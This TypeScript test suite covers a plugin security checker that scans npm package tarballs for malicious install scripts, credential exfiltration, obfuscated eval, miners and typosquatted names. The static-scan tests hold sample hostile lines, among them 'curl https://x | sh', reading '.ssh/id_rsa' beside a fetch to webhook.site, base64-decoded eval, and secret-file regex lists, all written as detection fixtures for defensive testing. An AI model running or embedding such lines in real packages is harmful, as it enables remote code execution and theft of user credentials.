import { createHash } from 'node:crypto'
import { gzipSync } from 'node:zlib'
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { createPluginSecurityChecker, disabledSecurityReport } from './index'
import type { SecurityFetcher } from './net'
import { SecurityFetchError } from './net'
import { allowedCodeloadUrl, allowedTarballUrl } from './registry'
import { packageJsonEntry, readTarEntries } from './tar'
import type { TarEntry } from './tar'
import { scanContent, scanScripts } from './scan'
import { checkPluginName } from './typosquat'
import { buildReport, checkOf } from './verdict'

/** 最小 ustar 构造器：测试只依赖标准头，不引入打包工具。 */
function tarHeader(path: string, size: number, type = '0', link = ''): Buffer {
  const header = Buffer.alloc(512)
  header.write(path.slice(0, 100), 0, 'utf8')
  header.write('0000644\0', 100, 'ascii')
  header.write('0000000\0', 108, 'ascii')
  header.write('0000000\0', 116, 'ascii')
  header.write(`${size.toString(8).padStart(11, '0')}\0`, 124, 'ascii')
  header.write('00000000000\0', 136, 'ascii')
  // 校验和字段先写空格，再按整块求和。
  header.fill(0x20, 148, 156)
  header.write(type, 156, 'ascii')
  header.write(link.slice(0, 100), 157, 'utf8')
  header.write('ustar\0', 257, 'ascii')
  header.write('00', 263, 'ascii')
  let sum = 0
  for (const byte of header) sum += byte
  header.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 'ascii')
  return header
}

function makeTar(files: Array<{ path: string; data: string | Buffer; type?: string }>): Buffer {
  const parts: Buffer[] = []
  for (const file of files) {
    const data = Buffer.isBuffer(file.data) ? file.data : Buffer.from(file.data)
    parts.push(tarHeader(file.path, data.length, file.type ?? '0'))
    parts.push(data)
    const pad = (512 - (data.length % 512)) % 512
    if (pad > 0) parts.push(Buffer.alloc(pad))
  }
  parts.push(Buffer.alloc(1024))
  return Buffer.concat(parts)
}

function entry(path: string, data: string): TarEntry {
  return {
    path,
    type: 'file',
    size: Buffer.byteLength(data),
    data: Buffer.from(data),
    unsafe: false,
    linkPath: null
  }
}

const MANIFEST_TYPE = {
  name: 'demo-plugin',
  version: '1.0.0',
  dist: {
    tarball: null,
    integrity: null,
    shasum: null,
    unpackedSize: null,
    fileCount: null,
    hasProvenance: false,
    hasSignatures: false
  },
  scripts: {},
  dependencies: {},
  repositoryUrl: null,
  deprecated: null,
  publisher: null,
  maintainers: []
}

afterEach(() => {
  vi.restoreAllMocks()
})

describe('tar 解析', () => {
  it('读取 package.json 与文件内容，路径去掉 package/ 前缀后交给扫描', () => {
    const buffer = makeTar([
      { path: 'package/package.json', data: JSON.stringify({ name: 'demo-plugin' }) },
      { path: 'package/index.js', data: 'module.exports = 1' }
    ])
    const entries = readTarEntries(buffer)
    expect(entries.map((item) => item.path)).toEqual(['package/package.json', 'package/index.js'])
    expect(entries[1]?.data?.toString('utf8')).toBe('module.exports = 1')
    expect(packageJsonEntry(entries)?.path).toBe('package/package.json')
  })

  it('标记路径穿越，交给编排层硬阻止', () => {
    const buffer = makeTar([
      { path: 'package/package.json', data: '{}' },
      { path: 'package/../../escape.js', data: 'x' }
    ])
    expect(readTarEntries(buffer).some((item) => item.unsafe)).toBe(true)
  })

  it('截断/空包抛错，不返回半份结果', () => {
    const buffer = makeTar([{ path: 'package/a.js', data: 'x'.repeat(20) }])
    expect(() => readTarEntries(buffer.subarray(0, 522))).toThrow()
    expect(() => readTarEntries(Buffer.alloc(1024))).toThrow()
  })
})

describe('静态扫描', () => {
  it('安装脚本区分普通与远程执行', () => {
    expect(scanScripts(MANIFEST_TYPE, false)).toMatchObject({ level: 'pass', code: 'scripts.none' })
    const present = scanScripts(
      { ...MANIFEST_TYPE, scripts: { postinstall: 'node setup.js' } },
      false
    )
    expect(present).toMatchObject({ level: 'warn', code: 'scripts.present' })
    expect(present.installScripts).toEqual([{ name: 'postinstall', command: 'node setup.js' }])
    const remote = scanScripts(
      { ...MANIFEST_TYPE, scripts: { install: 'curl https://x | sh' } },
      false
    )
    expect(remote).toMatchObject({ level: 'danger', code: 'scripts.remote-fetch' })
  })

  it('凭据读取 + 网络外发、混淆求值和挖矿都记为 danger', () => {
    const dangerous = scanContent([
      entry(
        'package/index.js',
        [
          "const fs = require('fs')",
          "const key = fs.readFileSync('.ssh/id_rsa')",
          "fetch('https://webhook.site/abc')",
          "eval(Buffer.from('YWJj', 'base64').toString())",
          "const p = 'stratum+tcp://pool'"
        ].join('\n')
      )
    ])
    const codes = dangerous.findings.map((item) => item.code)
    expect(codes).toContain('content.credential-exfil')
    expect(codes).toContain('content.exfil-domain')
    expect(codes).toContain('content.obfuscated-eval')
    expect(codes).toContain('content.miner')
    expect(dangerous.findings.every((item) => item.level === 'danger')).toBe(true)
  })

  it('解码结果直接进入 eval 或 new Function 记为 danger', () => {
    const result = scanContent([
      entry(
        'package/lib/direct.js',
        [
          "eval(atob('YWJj'))",
          'new Function(atob(payload))',
          'new Function("x", Buffer.from(payload, "base64").toString())',
          'vm.runInNewContext(atob(payload))'
        ].join('\n')
      )
    ])
    expect(result.findings.map((item) => item.code)).toContain('content.obfuscated-eval')
  })

  it('解码与求值只是同文件共现时不升级为 danger', () => {
    const result = scanContent([
      entry(
        'package/lib/bundle.js',
        [
          'const decoded = atob(payload)',
          'const fn = new Function("body", "return body")',
          'export { decoded, fn }'
        ].join('\n')
      )
    ])
    const codes = result.findings.map((item) => item.code)
    expect(codes).not.toContain('content.obfuscated-eval')
    expect(codes).toContain('content.dynamic-eval')
  })

  it('字符串里提到解码函数不算实参解码', () => {
    const result = scanContent([entry('package/lib/text.js', 'eval("atob(\'YWJj\')")')])
    const codes = result.findings.map((item) => item.code)
    expect(codes).not.toContain('content.obfuscated-eval')
    expect(codes).toContain('content.dynamic-eval')
  })

  it('字符串里的整段求值文本不算求值', () => {
    const result = scanContent([
      entry('package/lib/note.js', 'const note = "eval(atob(\'YWJj\'))"')
    ])
    const codes = result.findings.map((item) => item.code)
    expect(codes).not.toContain('content.obfuscated-eval')
    expect(codes).not.toContain('content.dynamic-eval')
  })

  it('变量间接解码只算动态求值', () => {
    const result = scanContent([
      entry('package/lib/indirect.js', ['const code = atob(payload)', 'eval(code)'].join('\n'))
    ])
    const codes = result.findings.map((item) => item.code)
    expect(codes).not.toContain('content.obfuscated-eval')
    expect(codes).toContain('content.dynamic-eval')
  })

  it('注释里提到敏感文件与网络库不算凭据外发', () => {
    const result = scanContent([
      entry(
        'package/lib/notes.js',
        [
          '/**',
          ' * pnpm 只认 npm 配置，所以代理要落到 .npmrc 或 npm_config_*，',
          ' * 目录抓取则走 undici（与 fetch( 同一条链路）。',
          ' */',
          'export const note = 1'
        ].join('\n')
      )
    ])
    expect(result.findings.map((item) => item.code)).not.toContain('content.credential-exfil')
    expect(result.findings.map((item) => item.code)).not.toContain('content.sensitive-read')
  })

  it('含引号的正则不会打断注释识别', () => {
    const result = scanContent([
      entry(
        'package/lib/pnpm-compat.js',
        [
          'function version(text) {',
          '  const match = /^packageManager:[ \\t]*[\'"]?pnpm@([0-9][^\\s\'"]*)[\'"]?[ \\t]*$/mu.exec(text)',
          '  // pnpm 只认 .npmrc，抓取走 undici 与 fetch( 同一条链路',
          '  return match?.[1] ?? null',
          '}'
        ].join('\n')
      )
    ])
    const codes = result.findings.map((item) => item.code)
    expect(codes).not.toContain('content.sensitive-read')
    expect(codes).not.toContain('content.credential-exfil')
  })

  it('正则字面量里列出的敏感文件名不算读取', () => {
    const result = scanContent([
      entry(
        'package/lib/secret-guard.mjs',
        [
          'const SECRET_NAME = /^(?:\\.env|\\.npmrc|\\.ssh|\\.aws|id_rsa)$/i;',
          'export const isSecret = (name) => SECRET_NAME.test(name);'
        ].join('\n')
      )
    ])
    expect(result.findings.map((item) => item.code)).not.toContain('content.sensitive-read')
    expect(result.capabilities.sensitive).toBe(0)
  })

  it('箭头函数返回的正则字面量同样遮掉敏感路径', () => {
    const result = scanContent([
      entry('package/lib/arrow.js', 'const guard = () => /\\.npmrc|\\.ssh/;\n')
    ])
    expect(result.findings.map((item) => item.code)).not.toContain('content.sensitive-read')
  })

  it('正则字面量里的网络与求值特征不算能力', () => {
    const result = scanContent([
      entry(
        'package/lib/pattern-tables.js',
        [
          'const NETWORK = /fetch\\(|axios|undici/;',
          'const EVAL = /eval\\(|new Function\\(/;',
          "const raw = readFileSync('.npmrc', 'utf8')"
        ].join('\n')
      )
    ])
    const codes = result.findings.map((item) => item.code)
    expect(codes).toContain('content.sensitive-read')
    expect(codes).not.toContain('content.credential-exfil')
    expect(codes).not.toContain('content.dynamic-eval')
    expect(result.capabilities.network).toBe(0)
    expect(result.capabilities.eval).toBe(0)
  })

  it('JSX 闭合标签不会被当成正则遮住后面的读取', () => {
    const result = scanContent([
      entry(
        'package/view.tsx',
        "const view = <div></div>; const raw = readFileSync('.npmrc'); // 注释"
      )
    ])
    expect(result.findings.map((item) => item.code)).toContain('content.sensitive-read')
  })

  it('正则之后的注释与代码仍被正确区分', () => {
    const result = scanContent([
      entry(
        'package/lib/after.js',
        [
          'const re = /[\'"]/u',
          '// 这里说明 .npmrc 的用途，不是读取',
          "const raw = readFileSync('.npmrc', 'utf8')"
        ].join('\n')
      )
    ])
    const finding = result.findings.find((item) => item.code === 'content.sensitive-read')
    expect(finding?.evidence[0]).toMatchObject({ file: 'lib/after.js', line: 3 })
  })

  it('遮掉注释后，代码命中的行号仍指向原文件', () => {
    const result = scanContent([
      entry(
        'package/lib/read.js',
        [
          '// 说明：读取 .npmrc 后再按需外发',
          "const raw = readFileSync('.npmrc', 'utf8')",
          "fetch('https://example.com')"
        ].join('\n')
      )
    ])
    const finding = result.findings.find((item) => item.code === 'content.credential-exfil')
    expect(finding?.evidence[0]).toMatchObject({ file: 'lib/read.js', line: 2 })
  })

  it('证据只给文件/行号/规则标签，不回传源码', () => {
    const result = scanContent([entry('package/index.js', "eval('1')\n")])
    const finding = result.findings.find((item) => item.code === 'content.dynamic-eval')
    expect(finding?.evidence[0]).toMatchObject({ file: 'index.js', line: 1 })
    expect(JSON.stringify(finding)).not.toContain("eval('1')")
  })
})

describe('下载地址白名单', () => {
  it('tarball 只允许与所选 registry 同源的 https 地址', () => {
    expect(
      allowedTarballUrl(
        'https://registry.npmmirror.com/demo-plugin/-/demo-plugin-1.0.0.tgz',
        'npmmirror'
      )
    ).not.toBeNull()
    expect(allowedTarballUrl('https://evil.example.com/demo.tgz', 'npmmirror')).toBeNull()
    expect(allowedTarballUrl('http://registry.npmmirror.com/demo.tgz', 'npmmirror')).toBeNull()
    expect(
      allowedTarballUrl('https://user:pass@registry.npmmirror.com/demo.tgz', 'npmmirror')
    ).toBeNull()
    expect(allowedTarballUrl(null, 'npmmirror')).toBeNull()
  })

  it('GitHub codeload 清洗 owner/repo 并编码 ref', () => {
    expect(allowedCodeloadUrl('demo', 'demo-plugin', 'main')).toBe(
      'https://codeload.github.com/demo/demo-plugin/tar.gz/main'
    )
    expect(allowedCodeloadUrl('de mo', 'demo-plugin', 'v1')).toBeNull()
    expect(allowedCodeloadUrl('demo', 'demo/plugin', 'v1')).toBeNull()
    expect(allowedCodeloadUrl('', 'repo', 'main')).toBeNull()
    expect(allowedCodeloadUrl('owner', '', 'main')).toBeNull()
    expect(allowedCodeloadUrl('demo', 'demo-plugin', 'feature/x')).toBe(
      'https://codeload.github.com/demo/demo-plugin/tar.gz/feature%2Fx'
    )
  })
})

describe('名称仿冒与判定', () => {
  it('相似名称给出 warn，正常名称 pass', () => {
    expect(checkPluginName('demo-plugin', [])).toMatchObject({ level: 'pass', code: 'name.ok' })
    expect(checkPluginName('dem0-plugin', ['demo-plugin'])).toMatchObject({
      level: 'warn',
      code: 'name.similar-installed'
    })
    expect(checkPluginName('@evil/deepseek-tools', [])).toMatchObject({
      level: 'warn',
      code: 'name.official-impersonation'
    })
  })

  it('与已装插件同 scope 视为同一发布者，只有相似但不同的 scope 才提示', () => {
    // 升级或同作者第二个插件：scope 完全相同，不是仿冒。
    expect(
      checkPluginName('@michengai/dsh-skills-manager', ['@michengai/dsh-archive-manager'])
    ).toMatchObject({ level: 'pass', code: 'name.ok' })
    // 抢注近似域：差一个字符，提示并指明相似的是哪个已装包。
    expect(
      checkPluginName('@micheng-ai/dsh-skills-manager', ['@michengai/dsh-archive-manager'])
    ).toMatchObject({
      level: 'warn',
      code: 'name.scope-similar',
      params: { similar: '@michengai/dsh-archive-manager' }
    })
  })

  it('danger 优先于 warn，blocked 不接受覆盖', () => {
    const report = buildReport({
      spec: 'demo@1.0.0',
      checks: [
        checkOf('scripts', 'warn', 'scripts.present', { count: 1 }),
        checkOf('integrity', 'blocked', 'integrity.mismatch')
      ],
      findings: [],
      facts: {
        source: 'npm',
        registry: 'npmmirror',
        publisher: null,
        maintainers: [],
        publishedAt: null,
        firstPublishedAt: null,
        versionCount: null,
        downloads30d: null,
        repositoryUrl: null,
        deprecated: null,
        hasProvenance: false,
        hasRegistrySignature: false,
        unpackedSize: null,
        fileCount: null,
        directDependencies: 0,
        nonRegistryDependencies: [],
        nativeModules: [],
        installScripts: []
      },
      fingerprint: null,
      essentialComplete: true,
      partial: false,
      durationMs: 1,
      checkedAt: '2026-01-01T00:00:00.000Z'
    })
    expect(report.verdict).toBe('blocked')
  })
})

/** npm/registry 取数桩：按 URL 返回 manifest、packument、下载量与 OSV。 */
function fakeFetcher(options: {
  tarball: Buffer
  integrity: string
  scripts?: Record<string, string>
  fetches?: { bytes: number }
}): SecurityFetcher {
  const dist = {
    tarball: 'https://registry.npmmirror.com/demo-plugin/-/demo-plugin-1.0.0.tgz',
    integrity: options.integrity,
    shasum: null,
    unpackedSize: 200,
    fileCount: 2,
    hasProvenance: false,
    hasSignatures: false
  }
  return {
    fetchJson: async (url) => {
      if (url.endsWith('/demo-plugin/1.0.0')) {
        return {
          name: 'demo-plugin',
          version: '1.0.0',
          dist,
          scripts: options.scripts ?? {},
          dependencies: {},
          repository: { type: 'git', url: 'https://github.com/demo/demo-plugin' },
          maintainers: [{ name: 'demo' }],
          _npmUser: { name: 'demo' }
        }
      }
      if (url.endsWith('/demo-plugin')) {
        return {
          time: { created: '2025-01-01T00:00:00.000Z', '1.0.0': '2025-01-02T00:00:00.000Z' },
          versions: { '1.0.0': {} },
          maintainers: [{ name: 'demo' }]
        }
      }
      if (url.includes('api.npmjs.org')) return { downloads: 5000 }
      return {}
    },
    fetchBytes: async () => {
      if (options.fetches !== undefined) options.fetches.bytes += 1
      return options.tarball
    },
    postJson: async () => ({ vulns: [] })
  }
}

function tarballBuffer(scripts: Record<string, string> = {}): Buffer {
  return gzipSync(
    makeTar([
      {
        path: 'package/package.json',
        data: JSON.stringify({ name: 'demo-plugin', version: '1.0.0', scripts })
      },
      { path: 'package/index.js', data: 'module.exports = 1' }
    ])
  )
}

describe('createPluginSecurityChecker', () => {
  it('npm pass：完整性通过、无脚本/漏洞时放行', async () => {
    const tarball = tarballBuffer()
    const integrity = `sha512-${createHash('sha512').update(tarball).digest('base64')}`
    const checker = createPluginSecurityChecker({
      fetcher: fakeFetcher({ tarball, integrity }),
      now: () => Date.parse('2026-01-03T00:00:00.000Z')
    })
    const report = await checker.check({
      spec: 'demo-plugin@1.0.0',
      registry: 'npmmirror',
      installed: []
    })
    expect(report.verdict).toBe('pass')
    expect(report.fingerprint).toBe(integrity)
    expect(report.facts.publisher).toBe('demo')
    expect(report.checks.find((item) => item.id === 'integrity')?.code).toBe('integrity.ok')
  })

  it('哈希不一致 → blocked（硬阻止）', async () => {
    const checker = createPluginSecurityChecker({
      fetcher: fakeFetcher({
        tarball: tarballBuffer(),
        integrity: `sha512-${Buffer.from('wrong').toString('base64')}`
      })
    })
    const report = await checker.check({
      spec: 'demo-plugin@1.0.0',
      registry: 'npmmirror',
      installed: []
    })
    expect(report.verdict).toBe('blocked')
    expect(report.findings.map((item) => item.code)).toContain('integrity.mismatch')
    // 硬阻止也给出完整清单，未执行的检查标为 skip。
    expect(report.checks.map((item) => item.id)).toEqual([
      'source',
      'integrity',
      'reputation',
      'name',
      'scripts',
      'content',
      'dependencies',
      'vulnerabilities'
    ])
  })

  it('报告缓存 10 分钟；refresh 绕过缓存', async () => {
    const tarball = tarballBuffer()
    const integrity = `sha512-${createHash('sha512').update(tarball).digest('base64')}`
    const fetches = { bytes: 0 }
    const checker = createPluginSecurityChecker({
      fetcher: fakeFetcher({ tarball, integrity, fetches }),
      now: () => Date.parse('2026-01-03T00:00:00.000Z')
    })
    const input = { spec: 'demo-plugin@1.0.0', registry: 'npmmirror' as const, installed: [] }
    await checker.check(input)
    await checker.check(input)
    expect(fetches.bytes).toBe(1)
    await checker.check({ ...input, refresh: true })
    expect(fetches.bytes).toBe(2)
  })

  it('本地 file: 目录扫描无需网络', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'dsh-security-'))
    try {
      await mkdir(join(dir, 'sub'))
      await writeFile(
        join(dir, 'package.json'),
        JSON.stringify({ name: 'local-plugin', version: '1.0.0', scripts: {} })
      )
      await writeFile(join(dir, 'index.js'), 'module.exports = 1')
      const checker = createPluginSecurityChecker()
      const report = await checker.check({
        spec: `file:${dir}`,
        registry: 'npmmirror',
        installed: []
      })
      expect(report.verdict).toBe('pass')
      expect(report.facts.source).toBe('file')
      expect(report.facts.fileCount).toBe(2)
    } finally {
      await rm(dir, { recursive: true, force: true })
    }
  })

  it('GitHub 未固定提交 → warn；固定提交 → pass', async () => {
    const tarball = tarballBuffer()
    const fetcher: SecurityFetcher = {
      fetchJson: async () => ({}),
      fetchBytes: async () => tarball,
      postJson: async () => ({})
    }
    const checker = createPluginSecurityChecker({ fetcher })
    const unpinned = await checker.check({
      spec: 'github:demo/demo-plugin',
      registry: 'npmmirror',
      installed: []
    })
    expect(unpinned.verdict).toBe('warn')
    expect(unpinned.findings.map((item) => item.code)).toContain('source.github.unpinned')
    const pinned = await checker.check({
      spec: 'github:demo/demo-plugin#0123456789abcdef0123456789abcdef01234567',
      registry: 'npmmirror',
      installed: []
    })
    expect(pinned.verdict).toBe('pass')
    expect(pinned.fingerprint).toBe('0123456789abcdef0123456789abcdef01234567')
  })

  it('非 GitHub 的 git 来源没有检查能力 → unavailable（允许确认后安装）', async () => {
    const checker = createPluginSecurityChecker()
    const report = await checker.check({
      spec: 'git+https://gitlab.com/foo/bar',
      registry: 'npmmirror',
      installed: []
    })
    expect(report.verdict).toBe('unavailable')
  })

  it('总预算到点返回 unavailable，不永久卡住安装确认', async () => {
    const checker = createPluginSecurityChecker({
      fetcher: {
        fetchJson: async () => new Promise(() => undefined),
        fetchBytes: async () => Buffer.alloc(0),
        postJson: async () => new Promise(() => undefined)
      },
      totalTimeoutMs: 10
    })
    const report = await checker.check({
      spec: 'demo-plugin@1.0.0',
      registry: 'npmmirror',
      installed: []
    })
    expect(report.verdict).toBe('unavailable')
  })

  it('版本不存在 → not-found 向上抛（用户可见，不降级为 unavailable）', async () => {
    const checker = createPluginSecurityChecker({
      fetcher: {
        fetchJson: async () => {
          throw new SecurityFetchError('http', 'HTTP 404', 404)
        },
        fetchBytes: async () => Buffer.alloc(0),
        postJson: async () => ({})
      }
    })
    await expect(
      checker.check({ spec: 'demo-plugin@1.0.0', registry: 'npmmirror', installed: [] })
    ).rejects.toThrow('版本不存在')
  })
})

describe('disabled 报告', () => {
  it('设置关闭时不带检查项、不要求确认', () => {
    const report = disabledSecurityReport('demo-plugin@1.0.0')
    expect(report).toMatchObject({ verdict: 'disabled', checks: [], findings: [] })
    expect(report.facts.installScripts).toEqual([])
  })
})
